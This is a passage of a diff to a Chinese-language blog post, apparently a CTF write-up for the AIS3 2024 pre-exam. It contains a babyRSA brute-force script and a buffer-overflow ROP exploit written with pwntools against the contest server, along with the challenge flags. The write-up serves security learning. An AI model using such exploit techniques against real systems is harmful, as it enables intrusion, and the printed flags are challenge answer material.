-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/babyRSA-code.png" alt="圖片"><br>在 <code>encrypt()</code> 裡面，是使用字元的 ASCII 一一加密，而不是整個字串轉成一個大數後再加密。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p><img src="/ais3-2024-pre-exam-write-up/babyRSA-code.png" alt="圖片"><br>在 <code>encrypt()</code> 裡面，是使用字元的 ASCII 一一加密，而不是整個字串轉成一個大數後再加密。</p>
 <p>因為是用 ASCII 一個字元一個字元加密，加上我們有密文。所以只要窮舉 ASCII 的數字假裝是明文，然後公鑰加密後跟實際密文比對，如果相符代表就是那個 ASCII 數字。整個過程中不需要找出真正的私鑰。</p>
 <p>Script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">encryped = []  <span class="comment"># 題目給的密文串列</span></span><br><span class="line">e, n = <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 題目給的公鑰</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> encryped:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        tmp = <span class="built_in">pow</span>(i, e, n)</span><br><span class="line">        <span class="keyword">if</span> c == tmp:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
@@ -297,17 +307,17 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;NeverUseTheCryptographyLibraryImplementedYourSelf&#125;</span><br></pre></td></tr></table></figure>
 
 <p>(實際上跑出來的東西是 <code>@)!,*^=AIS3&#123;NeverUseTheCryptographyLibraryImplementedYourSelf&#125;-=1#&amp;*</code>)</p>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Mathter"><a href="#Mathter" class="headerlink" title="Mathter"></a>Mathter</h3><p>用 Ghidra 打開執行檔後，<code>main()</code> 的邏輯：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter0.png" alt="圖片"></p>
-<p>而在 <code>calculator()</code> 裡面，發現原來按 “q” 可以退出計算機進到 <code>goodbye()</code>，否則就會一直在 <code>calculator()</code> 裡面。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter1.png" alt="圖片"></p>
-<p>而在 <code>goodbye()</code> 裡面用了很危險的 <code>gets()</code>：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter2.png" alt="圖片"></p>
-<p>這邊應該是一個很好的 buffer overflow 切入點。而從 assembly code 可以看到，<code>local_c</code> 應該是放在 <code>rbp-0x4</code>，所以我們的 padding 應該只要四個字元就可以到 <code>rbp</code> 的位置。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter3.png" alt="圖片"></p>
-<p>接著我在 gdb 執行的時候，偶然看到原來 <code>goodbye()</code> 上面有個 <code>win2()</code> 函數。<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter4.png" alt="圖片"></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Mathter"><a href="#Mathter" class="headerlink" title="Mathter"></a>Mathter</h3><p>用 Ghidra 打開執行檔後，<code>main()</code> 的邏輯：<br><img src="/ais3-2024-pre-exam-write-up/mathter0.png" alt="圖片"></p>
+<p>而在 <code>calculator()</code> 裡面，發現原來按 “q” 可以退出計算機進到 <code>goodbye()</code>，否則就會一直在 <code>calculator()</code> 裡面。<br><img src="/ais3-2024-pre-exam-write-up/mathter1.png" alt="圖片"></p>
+<p>而在 <code>goodbye()</code> 裡面用了很危險的 <code>gets()</code>：<br><img src="/ais3-2024-pre-exam-write-up/mathter2.png" alt="圖片"></p>
+<p>這邊應該是一個很好的 buffer overflow 切入點。而從 assembly code 可以看到，<code>local_c</code> 應該是放在 <code>rbp-0x4</code>，所以我們的 padding 應該只要四個字元就可以到 <code>rbp</code> 的位置。<br><img src="/ais3-2024-pre-exam-write-up/mathter3.png" alt="圖片"></p>
+<p>接著我在 gdb 執行的時候，偶然看到原來 <code>goodbye()</code> 上面有個 <code>win2()</code> 函數。<br><img src="/ais3-2024-pre-exam-write-up/mathter4.png" alt="圖片"></p>
 <p>用 ghidra 看了才發現，原來 <code>win1()</code> 跟 <code>win2()</code> 是印出 flag 的函數，所以只要我們把 return address 設定成 <code>win1()</code> 或 <code>win2()</code> 的位置，就可以得到 flag</p>
-<p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter5.png" alt="圖片"></p>
-<p><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter6.png" alt="圖片"></p>
+<p><img src="/ais3-2024-pre-exam-write-up/mathter5.png" alt="圖片"></p>
+<p><img src="/ais3-2024-pre-exam-write-up/mathter6.png" alt="圖片"></p>
 <p>但 <code>win1()</code> 跟 <code>win2()</code> 都要傳參數進去，像是 <code>win1()</code> 要傳 <code>-0x21524111</code>，也就是 <code>0xffffffffdeadbeef</code>。所以用 ROP 的方式，找到執行檔內可以使用的 gadget，讓參數存進 <code>rdi</code>，就可以在轉進 <code>win1()</code> 的同時帶有參數。</p>
-<p>用 ROPgadget 找到 <code>pop rdi</code> 的 gadget：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter7.png" alt="圖片"></p>
-<p>用 readelf 找到 <code>win1()</code> 和 <code>win2()</code> 的位置：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter-readelf.png" alt="圖片"></p>
+<p>用 ROPgadget 找到 <code>pop rdi</code> 的 gadget：<br><img src="/ais3-2024-pre-exam-write-up/mathter7.png" alt="圖片"></p>
+<p>用 readelf 找到 <code>win1()</code> 和 <code>win2()</code> 的位置：<br><img src="/ais3-2024-pre-exam-write-up/mathter-readelf.png" alt="圖片"></p>
 <p>而 payload 應該長這樣：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + rbp + pop_rdi + param1 + win1</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">payload = padding + rbp + pop_rdi + param2 + win2</span><br></pre></td></tr></table></figure>
 <p>程式執行流程是這樣：</p>
@@ -320,8 +330,8 @@
 <p>Script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;chals1.ais3.org&quot;</span></span><br><span class="line">port = <span class="number">50001</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line">padding = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">rbp = <span class="string">b&quot;BBBBCCCC&quot;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x402540</span>)</span><br><span class="line">win1 = p64(<span class="number">0x4018c5</span>)</span><br><span class="line">win2 = p64(<span class="number">0x401997</span>)</span><br><span class="line">param1 = p64(<span class="number">0xffffffffdeadbeef</span>)  <span class="comment"># -0x21524111</span></span><br><span class="line">param2 = p64(<span class="number">0xffffffffcafebabe</span>)  <span class="comment"># -0x35014542</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 param1 及 win1 換成 param2 及 win2 拿到完整 flag</span></span><br><span class="line">payload = padding + rbp + pop_rdi + param1 + win1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;[Y/n]&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>執行 <code>win1()</code>：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter8.png" alt="圖片"></p>
-<p>執行 <code>win2()</code>：<br><img src="/2024/07/16/AIS3-2024-pre-exam-write-up/mathter9.png" alt="圖片"></p>
+<p>執行 <code>win1()</code>：<br><img src="/ais3-2024-pre-exam-write-up/mathter8.png" alt="圖片"></p>
+<p>執行 <code>win2()</code>：<br><img src="/ais3-2024-pre-exam-write-up/mathter9.png" alt="圖片"></p>
 <p>Flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9&#125;</span><br></pre></td></tr></table></figure>
 
@@ -336,6 +346,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/AIS3/" rel="tag"># AIS3</a>
+          </div>
 
         
 
@@ -343,10 +356,13 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/07/08/AIS3-2022-pre-exam-write-up/" rel="prev" title="AIS3 2022 pre-exam write up">
+    <a href="/ais3-2022-pre-exam-write-up/" rel="prev" title="AIS3 2022 pre-exam write up">
       <i class="fa fa-chevron-left"></i> AIS3 2022 pre-exam write up
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/%E8%87%BA%E5%A4%A7%E8%B3%87%E5%B7%A5%E5%A4%A7%E4%B8%80%E4%B8%8B%E4%BF%AE%E8%AA%B2%E5%BF%83%E5%BE%97/" rel="next" title="臺大資工大一下修課心得">
+      臺大資工大一下修課心得 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -414,34 +430,39 @@
     <img class="site-author-image" itemprop="image" alt="onion chen"
       src="/uploads/avatar.jpg">
   <p class="site-author-name" itemprop="name">onion chen</p>
-  <div class="site-description" itemprop="description"></div>
+  <div class="site-description" itemprop="description">onion chen 的 Blog，紀錄一些有趣事物。</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
           
         <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/onion0905" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;onion0905" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/onion0905" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;onion0905" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.facebook.com/onion2005" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;onion2005" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
+        <a href="https://www.facebook.com/onion2005" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;onion2005" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://instagram.com/onion0905" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;onion0905" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+        <a href="https://instagram.com/onion0905" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;onion0905" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
       </span>
   </div>
 
@@ -466,13 +487,13 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">onion chen</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Pisces</a>
   </div>
 
         
